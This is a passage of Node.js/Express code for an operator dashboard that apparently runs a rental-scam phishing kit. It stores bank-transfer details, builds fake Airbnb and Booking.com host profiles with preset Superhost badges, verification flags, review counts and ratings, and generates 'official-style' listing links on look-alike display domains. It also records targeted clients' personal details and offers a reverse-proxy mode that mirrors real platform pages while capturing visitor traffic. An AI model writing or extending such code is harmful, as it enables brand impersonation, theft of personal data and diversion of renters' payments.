      var c = (document.getElementById('pcCountry')||{}).value || 'GB';
      var fields = PC_MAP[c] || PC_MAP.OTHER || [];
      document.querySelectorAll('.pc-field').forEach(function(el){
        var name = el.getAttribute('data-fields');
        el.style.display = fields.indexOf(name) >= 0 ? 'block' : 'none';
      });
    }
    pcApplyCountry();
    </script>`;
  res.send(clientPage('Payment Config', content, req.user));
});

app.post('/dashboard/payment-config', requireClient, (req, res) => {
  const b = req.body || {};
  const country = String(b.country || 'GB').trim().toUpperCase();
  const extra = JSON.stringify({ bsb: String(b.bsb || '').trim() });
  resolvePaymentConfig(req.user.id);
  db.prepare(`UPDATE payment_config SET country=?, bank_name=?, beneficiary=?, iban=?, bic=?,
    account_number=?, sort_code=?, routing_number=?, account_type=?, bank_address=?, reference_prefix=?, extra_json=?,
    updated_at=datetime('now') WHERE user_id=?`).run(
    country,
    String(b.bank_name||'').trim(),
    String(b.beneficiary||'').trim(),
    String(b.iban||'').trim(),
    String(b.bic||'').trim(),
    String(b.account_number||'').trim(),
    String(b.sort_code||'').trim(),
    String(b.routing_number||'').trim(),
    String(b.account_type||'').trim(),
    String(b.bank_address||'').trim(),
    String(b.reference_prefix||'ABB').trim() || 'ABB',
    extra,
    req.user.id
  );
  res.redirect('/dashboard/payment-config?saved=1');
});

// === HOSTS LIBRARY ===
app.get('/dashboard/hosts', requireClient, (req, res) => {
  const hosts = db.prepare('SELECT * FROM hosts WHERE user_id = ? ORDER BY updated_at DESC, id DESC').all(req.user.id);
  const msg = req.query.msg ? `<div style="background:#0f2a1a;border:1px solid #2e7d32;color:#c8e6c9;padding:12px 14px;border-radius:10px;margin-bottom:14px">${esc(String(req.query.msg))}</div>` : '';
  const rows = hosts.map(h => {
    const photo = h.photo
      ? `<img src="${esc(h.photo)}" style="width:40px;height:40px;border-radius:50%;object-fit:cover;border:2px solid rgba(255,255,255,.1);vertical-align:middle;margin-right:10px">`
      : `<span style="display:inline-flex;width:40px;height:40px;border-radius:50%;background:#222;align-items:center;justify-content:center;margin-right:10px;vertical-align:middle;color:#666;font-size:14px">?</span>`;
    return `<tr>
      <td style="padding:12px"><input type="checkbox" name="ids" value="${h.id}" class="hs-check"></td>
      <td style="padding:12px;color:#666;font-size:12px">#${h.id}</td>
      <td style="padding:12px;color:#fff;font-weight:600">${photo}${esc(h.name)}</td>
      <td style="padding:12px;color:#aaa">${Number(h.is_superhost)===1?'Superhost':'Host'}</td>
      <td style="padding:12px;color:#aaa">${esc(h.response_rate||'—')}</td>
      <td style="padding:12px;color:#aaa">${esc(h.joined_year||'—')}</td>
      <td style="padding:12px;color:#aaa">${esc(String(h.reviews_count??'—'))} · ${esc(String(h.rating||''))}</td>
      <td style="padding:12px;white-space:nowrap">
        <a href="/dashboard/hosts/edit/${h.id}" style="color:#4da3ff;margin-right:12px;text-decoration:none">Edit</a>
        <a href="/dashboard/hosts/delete/${h.id}" onclick="return confirm('Delete host?')" style="color:#f44336;text-decoration:none">Delete</a>
      </td>
    </tr>`;
  }).join('') || `<tr><td colspan="8" style="padding:32px;color:#666;text-align:center">No hosts yet. Add your first host profile below.</td></tr>`;
  let content = `${msg}<div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:8px">
      <div>
        <h1 style="margin:0 0 6px">Hosts</h1>
        <p style="color:#777;margin:0;font-size:14px">Save host profiles once, then pick them when creating Airbnb or Booking listings.</p>
      </div>
      <a href="#hostForm" style="padding:12px 20px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border-radius:12px;text-decoration:none;font-weight:700;box-shadow:0 8px 24px rgba(255,56,92,.25)">+ New host</a>
    </div>
    <form method="POST" action="/dashboard/hosts/delete-bulk" id="hsBulkForm" onsubmit="return confirm('Delete selected hosts?')">
    <div style="display:flex;gap:10px;align-items:center;margin:16px 0 10px;flex-wrap:wrap">
      <button type="submit" class="btn btn-danger" id="hsBulkBtn" disabled style="opacity:.45">Delete selected (<span id="hsSelCount">0</span>)</button>
      <label style="color:#aaa;font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" id="hsCheckAll"> Select all</label>
    </div>
    <div class="panel" style="overflow-x:auto;border-radius:14px">
      <table class="data-table" style="width:100%">
        <tr style="color:#666;font-size:11px;text-transform:uppercase;letter-spacing:.04em">
          <th style="padding:12px"></th><th style="padding:12px">ID</th><th style="padding:12px">Host</th><th style="padding:12px">Type</th><th style="padding:12px">Response</th><th style="padding:12px">Joined</th><th style="padding:12px">Reviews</th><th style="padding:12px"></th>
        </tr>
        ${rows}
      </table>
    </div></form>
    <div style="margin-top:28px">${hostFormHtml(null)}</div>
    <script>(function(){
      var form=document.getElementById('hsBulkForm'); if(!form) return;
      var all=document.getElementById('hsCheckAll'), btn=document.getElementById('hsBulkBtn'), cnt=document.getElementById('hsSelCount');
      function boxes(){return Array.prototype.slice.call(form.querySelectorAll('.hs-check'));}
      function refresh(){var b=boxes(),n=b.filter(function(x){return x.checked}).length; cnt.textContent=n; btn.disabled=n===0; btn.style.opacity=n?1:.45; if(all) all.checked=n>0&&n===b.length;}
      form.addEventListener('change', refresh); if(all) all.addEventListener('change', function(){boxes().forEach(function(x){x.checked=all.checked}); refresh();}); refresh();
    })();</script>`;
  res.send(clientPage('Hosts', content, req.user));
});

app.get('/dashboard/hosts/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const host = db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!host) return res.redirect('/dashboard/hosts');
  const content = `<div style="margin-bottom:8px"><a href="/dashboard/hosts" style="color:#8899ff;text-decoration:none;font-size:14px">← Back to Hosts</a></div>${hostFormHtml(host)}`;
  res.send(clientPage('Hosts', content, req.user));
});

app.get('/dashboard/hosts/delete/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  db.prepare('DELETE FROM hosts WHERE id = ? AND user_id = ?').run(id, req.user.id);
  res.redirect('/dashboard/hosts?msg=Host+deleted');
});

app.post('/dashboard/hosts/delete-bulk', requireClient, (req, res) => {
  let ids = req.body.ids || [];
  if (!Array.isArray(ids)) ids = [ids];
  ids = ids.map(x => parseInt(x, 10)).filter(n => n > 0);
  let n = 0;
  for (const id of ids) {
    const r = db.prepare('DELETE FROM hosts WHERE id = ? AND user_id = ?').run(id, req.user.id);
    n += r.changes || 0;
  }
  res.redirect('/dashboard/hosts?msg=Deleted+' + n + '+hosts');
});

app.post('/dashboard/hosts/save', requireClient, (req, res, next) => {
  listingUpload(req, res, (err) => {
    if (err) return res.status(400).send('Upload error: ' + (err.message || err));
    try {
      const b = req.body || {};
      const id = parseInt(b.id, 10) || 0;
      const name = (b.name || '').trim();
      if (!name) return res.status(400).send('Host name required');
      let existing = id ? db.prepare('SELECT * FROM hosts WHERE id = ? AND user_id = ?').get(id, req.user.id) : null;
      let photo = (existing && existing.photo) || '';
      const fileBag = req.files || {};
      const hostFiles = Array.isArray(fileBag.host_photo) ? fileBag.host_photo : [];
      if (hostFiles[0]) photo = '/uploads/' + hostFiles[0].filename;
      if (b.photo_url && String(b.photo_url).trim()) photo = String(b.photo_url).trim();
      if (b.remove_photo === '1') photo = '';
      const fields = [
        name,
        photo,
        (b.is_superhost === '1' || b.is_superhost === 'on') ? 1 : 0,
        (b.joined_year || '2018').trim(),
        (b.response_rate || '100%').trim(),
        (b.response_time || 'within an hour').trim(),
        (b.languages || 'English').trim(),
        (b.identity_verified === '1' || b.identity_verified === 'on' || b.identity_verified === undefined) ? 1 : 0,
        b.about || '',
        (b.location || '').trim(),
        parseInt(b.reviews_count, 10) || 48,
        (b.rating || '4.92').trim()
      ];
      if (existing) {
        db.prepare(`UPDATE hosts SET name=?, photo=?, is_superhost=?, joined_year=?, response_rate=?, response_time=?,
          languages=?, identity_verified=?, about=?, location=?, reviews_count=?, rating=?, updated_at=datetime('now')
          WHERE id=? AND user_id=?`).run(...fields, id, req.user.id);
      } else {
        db.prepare(`INSERT INTO hosts (user_id, name, photo, is_superhost, joined_year, response_rate, response_time,
          languages, identity_verified, about, location, reviews_count, rating)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(req.user.id, ...fields);
      }
      res.redirect('/dashboard/hosts?msg=Host+saved');
    } catch (e) {
      console.error('host save', e);
      res.status(500).send('Error: ' + e.message);
    }
  });
});

function hostFormHtml(host) {
  const H = host || {};
  const isEdit = !!(H && H.id);
  const photoPrev = H.photo
    ? `<div style="display:flex;align-items:center;gap:14px;margin-bottom:12px">
        <img src="${esc(H.photo)}" style="width:72px;height:72px;border-radius:50%;object-fit:cover;border:2px solid rgba(255,255,255,.1)">
        <label style="color:#aaa;font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" name="remove_photo" value="1"> Remove photo</label>
      </div>` : '';
  return `
<style>
.mf-card{background:linear-gradient(165deg,#16162a 0%,#0f0f1c 100%);border:1px solid rgba(255,255,255,.06);border-radius:18px;padding:28px;margin-bottom:24px;box-shadow:0 16px 48px rgba(0,0,0,.35)}
.mf-card h2{margin:0 0 4px;font-size:20px;font-weight:700;color:#fff}
.mf-card .mf-sub{color:#6b7280;font-size:13px;margin:0 0 22px}
.mf-sec{font-size:13px;font-weight:700;color:#e5e7eb;margin:20px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;gap:10px}
.mf-sec span{display:inline-flex;width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,#FF385C,#E61E4D);color:#fff;font-size:11px;font-weight:800;align-items:center;justify-content:center}
.mf-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.mf-grid .full{grid-column:1/-1}
.mf-field label{display:block;font-size:11px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:#6b7280;margin-bottom:6px}
.mf-field input,.mf-field select,.mf-field textarea{width:100%;padding:11px 13px;background:#0a0a14;border:1px solid rgba(255,255,255,.08);color:#f3f4f6;border-radius:11px;font-size:14px}
.mf-field input:focus,.mf-field select:focus,.mf-field textarea:focus{outline:none;border-color:rgba(255,56,92,.55);box-shadow:0 0 0 3px rgba(255,56,92,.12)}
.mf-check{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px}
.mf-check input{width:17px;height:17px;accent-color:#FF385C}
.mf-check label{color:#d1d5db;font-size:13px;margin:0;cursor:pointer}
.mf-btn{padding:13px 26px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer;box-shadow:0 10px 28px rgba(255,56,92,.28)}
.mf-actions{display:flex;align-items:center;gap:14px;margin-top:20px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06)}
.mf-hint{color:#6b7280;font-size:12px;margin-top:6px}
@media(max-width:800px){.mf-grid{grid-template-columns:1fr}}
</style>
<form method="POST" action="/dashboard/hosts/save" enctype="multipart/form-data" class="mf-card" id="hostForm">
  ${isEdit ? `<input type="hidden" name="id" value="${H.id}">` : ''}
  <h2>${isEdit ? 'Edit host' : 'New host'}</h2>
  <p class="mf-sub">Profile shown on the public listing (name, photo, Superhost badge, response stats).</p>
  <div class="mf-sec"><span>1</span> Profile</div>
  ${photoPrev}
  <div class="mf-grid">
    <div class="mf-field"><label>Host name *</label><input name="name" required value="${esc(H.name||'')}" placeholder="Camille"></div>
    <div class="mf-field"><label>Location</label><input name="location" value="${esc(H.location||'')}" placeholder="London, UK"></div>
    <div class="mf-field"><label>Photo upload</label><input type="file" name="host_photo" accept="image/*"></div>
    <div class="mf-field"><label>Or photo URL</label><input name="photo_url" value="${esc((H.photo && !String(H.photo).startsWith('/uploads/')) ? H.photo : '')}" placeholder="https://…/host.jpg"></div>
    <div class="full mf-check"><input type="checkbox" name="is_superhost" value="1" id="hsSuper"${(H.is_superhost===undefined||Number(H.is_superhost)===1)?' checked':''}><label for="hsSuper">Superhost</label></div>
    <div class="full mf-check"><input type="checkbox" name="identity_verified" value="1" id="hsId"${(H.identity_verified===undefined||Number(H.identity_verified)===1)?' checked':''}><label for="hsId">Identity verified</label></div>
  </div>
  <div class="mf-sec"><span>2</span> Stats</div>
  <div class="mf-grid">
    <div class="mf-field"><label>Joined year</label><input name="joined_year" value="${esc(H.joined_year||'2018')}" placeholder="2018"></div>
    <div class="mf-field"><label>Response rate</label><input name="response_rate" value="${esc(H.response_rate||'100%')}" placeholder="100%"></div>
    <div class="mf-field"><label>Response time</label><input name="response_time" value="${esc(H.response_time||'within an hour')}" placeholder="within an hour"></div>
    <div class="mf-field"><label>Languages</label><input name="languages" value="${esc(H.languages||'English')}" placeholder="English, French"></div>
    <div class="mf-field"><label>Reviews count</label><input type="number" name="reviews_count" value="${H.reviews_count??48}" min="0"></div>
    <div class="mf-field"><label>Rating</label><input name="rating" value="${esc(String(H.rating||'4.92'))}"></div>
  </div>
  <div class="mf-sec"><span>3</span> About</div>
  <div class="mf-grid">
    <div class="mf-field full"><label>About the host</label><textarea name="about" rows="4" placeholder="Short bio shown on the listing…">${esc(H.about||'')}</textarea></div>
  </div>
  <div class="mf-actions">
    <button class="mf-btn" type="submit">${isEdit ? 'Save changes' : 'Save host'}</button>
    ${isEdit ? '<a href="/dashboard/hosts" style="color:#8899ff;font-size:13px;text-decoration:none">Cancel</a>' : ''}
  </div>
</form>`;
}


// Airbnb/Booking menu pages removed — redirect handlers registered near Create/Listări



function parseListingImages(listing) {
  let imgs = [];
  try { if (listing.images) imgs = JSON.parse(listing.images); } catch (e) {}
  if ((!imgs || !imgs.length) && listing.image_url) imgs = [listing.image_url];
  if (!imgs || !imgs.length) {
    imgs = [
      'https://images.unsplash.com/photo-1560448204-e02f11c3d0e2?w=1200',
      'https://images.unsplash.com/photo-1502672260266-1c1ef2d93688?w=800',
      'https://images.unsplash.com/photo-1522708323590-d24dbb6b0267?w=800',
      'https://images.unsplash.com/photo-1493809842364-78817add7ffb?w=800',
      'https://images.unsplash.com/photo-1484154218962-a197022b5858?w=800'
    ];
  }
  return imgs;
}

function esc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&' + 'amp;')
    .replace(/</g, '&' + 'lt;')
    .replace(/>/g, '&' + 'gt;')
    .replace(/"/g, '&' + 'quot;')
    .replace(/'/g, '&#39;');
}

function listingCreateFormHtml(fixedMarketplace, listing, opts) {
  opts = opts || {};
  const L = listing || null;
  const isEdit = !!(L && L.id);
  const mpFixed = fixedMarketplace || opts.fixedMarketplace || '';
  const mp = (isEdit ? (L.marketplace || 'airbnb') : (mpFixed || '')).toLowerCase();
  const apartments = Array.isArray(opts.apartments) ? opts.apartments : [];
  const hosts = Array.isArray(opts.hosts) ? opts.hosts : [];
  const selApt = isEdit ? L.apartment_id : opts.selectedApartmentId;
  const selHost = isEdit ? L.host_id : opts.selectedHostId;
  const aptOptions = ['<option value="">— Select apartment —</option>'].concat(
    apartments.map(a => `<option value="${a.id}"${Number(selApt)===Number(a.id) ? ' selected' : ''}>${esc(a.name || a.title)}${a.location ? ' · ' + esc(a.location) : ''}</option>`)
  ).join('');
  const hostOptions = ['<option value="">— Select host —</option>'].concat(
    hosts.map(h => `<option value="${h.id}"${Number(selHost)===Number(h.id) ? ' selected' : ''}>${esc(h.name)}${Number(h.is_superhost)===1 ? ' · Superhost' : ''}</option>`)
  ).join('');

  let existingAmens = [];
  if (isEdit && L.amenities) existingAmens = String(L.amenities).split(',').map(s => s.trim()).filter(Boolean);
  const amenChecks = (typeof amenityChipsHtml === 'function')
    ? amenityChipsHtml(isEdit ? existingAmens : [])
    : AMENITY_LIST.map((a, i) => {
        const checked = isEdit ? (existingAmens.some(x => x.toLowerCase() === a.toLowerCase()) ? ' checked' : '') : (i < 10 ? ' checked' : '');
        return `<label class="amen-item"><input type="checkbox" name="amenity" value="${esc(a)}"${checked}><span class="amen-label">${esc(a)}</span></label>`;
      }).join('');

  const selDomain = isEdit ? (L.display_domain || '') : '';
  const abDomains = DOMAIN_OPTIONS.airbnb.map((d, i) => {
    const sel = selDomain ? (d.host === selDomain) : (i === 0 && mp !== 'booking');
    return `<option value="${d.host}"${sel ? ' selected' : ''}>${d.label}</option>`;
  }).join('');
  const bkDomains = DOMAIN_OPTIONS.booking.map((d, i) => {
    const sel = selDomain ? (d.host === selDomain) : (i === 0 && mp === 'booking');
    return `<option value="${d.host}"${sel ? ' selected' : ''}>${d.label}</option>`;
  }).join('');

  const accent = mp === 'booking' ? '#0071c2' : '#FF385C';
  const accent2 = mp === 'booking' ? '#003580' : '#E61E4D';
  const platformLabel = mp === 'booking' ? 'Booking.com' : (mp === 'airbnb' ? 'Airbnb' : 'Listing');

  const platformBlock = mp
    ? `<input type="hidden" name="marketplace" value="${mp}">
       <div class="mf-platform-badge" style="--acc:${accent}">${platformLabel}</div>`
    : `<div class="mf-plat-row">
         <label class="mf-plat"><input type="radio" name="marketplace" value="airbnb" checked onchange="mfOnMp(this.value)"><div><strong>Airbnb</strong><small>rooms / airbnb.*</small></div></label>
         <label class="mf-plat"><input type="radio" name="marketplace" value="booking" onchange="mfOnMp(this.value)"><div><strong>Booking.com</strong><small>hotel / booking.*</small></div></label>
       </div>`;

  const mediaEdit = isEdit ? (() => {
    let imgs = [];
    try { imgs = L.images ? JSON.parse(L.images) : []; } catch (e) { imgs = []; }
    if (!imgs.length && L.image_url) imgs = [L.image_url];
    const gal = imgs.length ? `<div class="mf-media-grid">${imgs.map(u => `<label class="mf-thumb"><img src="${esc(u)}"><span><input type="checkbox" name="remove_image" value="${esc(u)}"> Remove</span></label>`).join('')}</div>` : '';
    const hostPrev = L.host_photo ? `<div style="margin:8px 0 12px;display:flex;align-items:center;gap:12px"><img src="${esc(L.host_photo)}" style="width:56px;height:56px;border-radius:50%;object-fit:cover"><label style="color:#aaa;font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" name="remove_host_photo" value="1"> Remove host photo</label></div>` : '';
    const vidPrev = L.video_url ? `<p class="mf-hint">Video: <a href="${esc(L.video_url)}" target="_blank" style="color:#4da3ff">${esc(L.video_url)}</a>
      <label style="margin-left:10px;color:#ccc"><input type="checkbox" name="remove_video" value="1"> Remove</label></p>` : '';
    return gal + hostPrev + vidPrev;
  })() : '';

  return `
<style>
.mf-card{background:linear-gradient(165deg,#16162a 0%,#0f0f1c 100%);border:1px solid rgba(255,255,255,.06);border-radius:18px;padding:28px;margin-bottom:28px;box-shadow:0 16px 48px rgba(0,0,0,.35)}
.mf-card h2{margin:0 0 4px;font-size:20px;font-weight:700;color:#fff;letter-spacing:-.02em}
.mf-card .mf-sub{color:#6b7280;font-size:13px;margin:0 0 20px;line-height:1.45}
.mf-sec{font-size:13px;font-weight:700;color:#e5e7eb;margin:22px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;gap:10px}
.mf-sec span{display:inline-flex;width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,${accent},${accent2});color:#fff;font-size:11px;font-weight:800;align-items:center;justify-content:center}
.mf-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.mf-grid .full{grid-column:1/-1}
.mf-field label{display:block;font-size:11px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:#6b7280;margin-bottom:6px}
.mf-field input,.mf-field select,.mf-field textarea{width:100%;padding:11px 13px;background:#0a0a14;border:1px solid rgba(255,255,255,.08);color:#f3f4f6;border-radius:11px;font-size:14px}
.mf-field input:focus,.mf-field select:focus,.mf-field textarea:focus{outline:none;border-color:rgba(255,56,92,.55);box-shadow:0 0 0 3px rgba(255,56,92,.12)}
.mf-field input::placeholder,.mf-field textarea::placeholder{color:#4b5563}
.mf-platform-badge{display:inline-flex;align-items:center;padding:10px 16px;border-radius:12px;font-weight:700;color:#fff;background:linear-gradient(90deg,var(--acc,#FF385C),#111);border:1px solid rgba(255,255,255,.08);margin-bottom:4px}
.mf-plat-row{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:4px}
.mf-plat{display:flex;gap:12px;align-items:flex-start;padding:14px 16px;border-radius:14px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.02);cursor:pointer}
.mf-plat:has(input:checked){border-color:rgba(255,56,92,.55);background:rgba(255,56,92,.08)}
.mf-plat input{margin-top:3px;accent-color:#FF385C}
.mf-plat strong{display:block;color:#fff;font-size:14px}
.mf-plat small{color:#6b7280;font-size:12px}
.mf-preview{margin-top:10px;padding:12px 14px;background:#0a0a14;border:1px dashed rgba(255,255,255,.1);border-radius:12px;font-size:12.5px;color:#9ca3af;line-height:1.55;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
.mf-preview span{color:#6b7280;font-family:inherit}
.mf-lib-card{display:grid;grid-template-columns:1fr 1fr;gap:14px;padding:16px;background:rgba(255,255,255,.025);border:1px solid rgba(255,255,255,.06);border-radius:14px}
.mf-hint{color:#6b7280;font-size:12px;margin-top:6px;line-height:1.4}
.mf-hint a{color:#8899ff;text-decoration:none}
.mf-check{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px}
.mf-check input{width:17px;height:17px;accent-color:${accent}}
.mf-check label{color:#d1d5db;font-size:13px;margin:0;cursor:pointer}
.amen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(148px,1fr));gap:8px;padding:14px;background:#0a0a14;border:1px solid rgba(255,255,255,.06);border-radius:14px;max-height:220px;overflow:auto}
.amen-item{display:flex;align-items:center;gap:8px;padding:9px 11px;border-radius:10px;background:rgba(255,255,255,.03);border:1px solid transparent;cursor:pointer}
.amen-item:has(input:checked){border-color:rgba(255,56,92,.5);background:rgba(255,56,92,.1)}
.amen-item input{width:15px;height:15px;accent-color:#FF385C;margin:0;flex-shrink:0}
.amen-label{font-size:12.5px;color:#d1d5db;font-weight:500}
.mf-btn{padding:13px 26px;background:linear-gradient(90deg,${accent},${accent2});color:#fff;border:none;border-radius:12px;font-weight:700;cursor:pointer;box-shadow:0 10px 28px rgba(0,0,0,.25);font-size:14px}
.mf-actions{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-top:22px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06)}
.mf-media-grid{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:12px}
.mf-thumb{position:relative;width:104px;cursor:pointer}
.mf-thumb img{width:104px;height:76px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,.08);display:block}
.mf-thumb span{position:absolute;left:4px;bottom:4px;background:rgba(0,0,0,.78);color:#fff;font-size:10px;padding:2px 6px;border-radius:5px;display:flex;align-items:center;gap:4px}
.mf-stat{padding:12px 14px;background:#0a0a14;border:1px solid rgba(255,255,255,.06);border-radius:12px;text-align:center}
.mf-stat .k{font-size:11px;color:#6b7280;margin-bottom:4px}
.mf-stat .v{font-size:16px;font-weight:700;color:#e5e7eb}
.mf-custom{${isEdit ? '' : 'display:none;'}}
@media(max-width:800px){.mf-grid,.mf-lib-card,.mf-plat-row{grid-template-columns:1fr}}
</style>
<form method="POST" action="${isEdit ? '/dashboard/listings/update/' + L.id : '/dashboard/listings/create'}" enctype="multipart/form-data" class="mf-card" id="createListingForm">
  <h2>${isEdit ? ('Edit listing #' + L.id) : ('Create ' + platformLabel + ' listing')}</h2>
  <p class="mf-sub">${isEdit
    ? 'Update client info, link settings, or property details.'
    : 'Select apartment & host from your libraries, fill client details, generate the public link.'}</p>

  <div class="mf-sec" data-client-block="1"><span>1</span> Client</div>
  <div class="mf-grid" data-client-block="1">
    <div class="mf-field"><label>First name *</label><input type="text" name="client_first_name" required placeholder="Julio Manuel" value="${isEdit ? esc(L.client_first_name || '') : ''}"></div>
    <div class="mf-field"><label>Last name *</label><input type="text" name="client_last_name" required placeholder="Villanueva" value="${isEdit ? esc(L.client_last_name || '') : ''}"></div>
    <div class="mf-field"><label>Phone</label><input type="text" name="client_phone" placeholder="07…" value="${isEdit ? esc(L.client_phone || '') : ''}"></div>
    <div class="mf-field"><label>Email</label><input type="email" name="client_email" placeholder="client@email.com" value="${isEdit ? esc(L.client_email || '') : ''}"></div>
    <div class="mf-field full"><label>Full address</label><input type="text" name="client_address" placeholder="Street, city, postcode" value="${isEdit ? esc(L.client_address || '') : ''}"></div>
    <div class="mf-field full"><label>Stay duration</label><input type="text" name="client_stay_duration" placeholder="e.g. 7 nights / 1 month" value="${isEdit ? esc(L.client_stay_duration || '') : ''}"></div>
  </div>

  <div class="mf-sec"><span>2</span> Libraries</div>
  <div class="mf-lib-card">
    <div class="mf-field">
      <label>Apartment *</label>
      <select name="apartment_id" id="mfApartment" ${isEdit ? '' : 'required'} onchange="mfOnApartment(this.value)">
        ${aptOptions}
      </select>
      <p class="mf-hint">Manage in <a href="/dashboard/apartments">Apartments</a>. Photos, price & description come from the template.</p>
    </div>
    <div class="mf-field">
      <label>Host *</label>
      <select name="host_id" id="mfHost" ${isEdit ? '' : 'required'}>
        ${hostOptions}
      </select>
      <p class="mf-hint">Manage in <a href="/dashboard/hosts">Hosts</a>. Name & photo applied automatically.</p>
    </div>
  </div>

  <div class="mf-sec"><span>3</span> Platform & link</div>
  ${platformBlock}
  <div class="mf-grid" style="margin-top:14px">
    <div class="mf-field"><label>Display domain *</label>
      <select name="display_domain" id="mfDomain" onchange="mfPreviewUrl()">
        <optgroup label="Airbnb" id="mfOgAb">${abDomains}</optgroup>
        <optgroup label="Booking" id="mfOgBk"${mp === 'airbnb' ? ' disabled' : ''}>${bkDomains}</optgroup>
      </select>
    </div>
    <div class="mf-field"><label>Listing ID / code (optional)</label>
      <input type="text" name="listing_code" id="mfCode" placeholder="e.g. 8272397239" oninput="mfPreviewUrl()" value="${isEdit ? esc(L.listing_code || '') : ''}" ${isEdit ? 'readonly style="opacity:.7"' : ''}>
    </div>
    <div class="mf-field"><label>Country / language</label>
      <select name="locale" id="mfLocale" onchange="mfOnLocale()">
        ${['fr','gb','us','es','de','it','pt','ro','nl','jp','au','br'].map(code => {
          const labels = {fr:'🇫🇷 France / Français',gb:'🇬🇧 United Kingdom / English',us:'🇺🇸 United States / English',es:'🇪🇸 España / Español',de:'🇩🇪 Deutschland / Deutsch',it:'🇮🇹 Italia / Italiano',pt:'🇵🇹 Portugal / Português',ro:'🇷🇴 România / Română',nl:'🇳🇱 Nederland / Nederlands',jp:'🇯🇵 日本 / 日本語',au:'🇦🇺 Australia / English',br:'🇧🇷 Brasil / Português'};
          const cur = isEdit ? (L.locale || 'gb') : 'gb';
          return `<option value="${code}"${cur === code ? ' selected' : ''}>${labels[code]}</option>`;
        }).join('')}
      </select>
    </div>
    <div class="mf-field" style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
      <div class="mf-stat"><div class="k">Currency</div><div class="v" id="mfCurrencyDisplay">£ — GBP</div></div>
      <div class="mf-stat"><div class="k">Page language</div><div class="v" id="mfLangDisplay">English</div></div>
    </div>
  </div>
  <div class="mf-preview" id="mfUrlPreview"><span>Preview:</span> https://www.airbnb.com/rooms/••••••••••</div>
  <p class="mf-hint">Real send link uses <strong style="color:#9ca3af">${BASE_URL}</strong> with the same path. Copy the official-style URL from the table after generate.</p>

  <div class="mf-sec"><span>4</span> Reverse proxy <span style="font-size:11px;font-weight:500;color:#6b7280;background:transparent;width:auto;height:auto;margin-left:4px">(optional)</span></div>
  <div class="mf-grid">
    <div class="full mf-check">
      <input type="checkbox" name="proxy_mode" value="1" id="mfProxyMode"${isEdit && Number(L.proxy_mode)===1 ? ' checked' : ''}>
      <label for="mfProxyMode"><strong style="color:#fff">Mirror real Airbnb/Booking page</strong> — client sees original look; traffic is captured here.</label>
    </div>
    <div class="mf-field full"><label>Real listing URL</label>
      <input type="text" name="proxy_target_url" placeholder="https://www.airbnb.com/rooms/1234567890" value="${isEdit ? esc(L.proxy_target_url || '') : ''}">
      <p class="mf-hint">Use a real open listing URL. Dead IDs fall back to the Airbnb shell + your photos/price.</p>
    </div>
  </div>

  <div id="mfCustomBlock" class="mf-custom">
    <div class="mf-sec"><span>5</span> Property details ${isEdit ? '' : '(only if no apartment selected)'}</div>
    <div class="mf-grid">
      <div class="mf-field full"><label>Title</label><input type="text" name="title" id="mfTitle" placeholder="Luxury apartment…" value="${isEdit ? esc(L.title || '') : ''}" ${isEdit ? 'required' : ''}></div>
      <div class="mf-field"><label>Location</label><input type="text" name="location" id="mfLocation" placeholder="Paris, France" value="${isEdit ? esc(L.location || '') : ''}" ${isEdit ? 'required' : ''}></div>
      <div class="mf-field"><label>Host name (fallback)</label><input type="text" name="host_name" placeholder="Camille" value="${isEdit ? esc(L.host_name || '') : ''}"></div>
      <div class="mf-field"><label id="mfPriceNightLbl">Price / night</label><input type="number" step="0.01" name="price" id="mfPriceNight" placeholder="189" value="${isEdit ? esc(String(L.price ?? '')) : ''}" ${isEdit ? 'required' : ''}></div>
      <div class="mf-field"><label id="mfPriceMonthLbl">Price / month</label><input type="number" step="0.01" name="price_month" id="mfPriceMonth" placeholder="3850" value="${isEdit ? esc(String(L.price_month ?? '')) : ''}" ${isEdit ? 'required' : ''}></div>
      <div class="full mf-check"><input type="checkbox" name="hide_nightly" value="1" id="mfHideNightly"${isEdit && Number(L.hide_nightly)===1 ? ' checked' : ''}><label for="mfHideNightly">Hide nightly — show monthly only</label></div>
      <div class="mf-field"><label>Property type</label>
        <select name="property_type">${['Entire apartment','Entire home','Private room','Hotel room','Shared room','Boutique hotel'].map(pt => {
          const cur = isEdit ? (L.property_type || 'Entire apartment') : 'Entire apartment';
          return `<option${cur===pt?' selected':''}>${pt}</option>`;
        }).join('')}</select>
      </div>
      <div class="mf-field"><label>Guests</label><input type="number" name="guests" value="${isEdit ? (L.guests || 4) : 4}" min="1" max="16"></div>
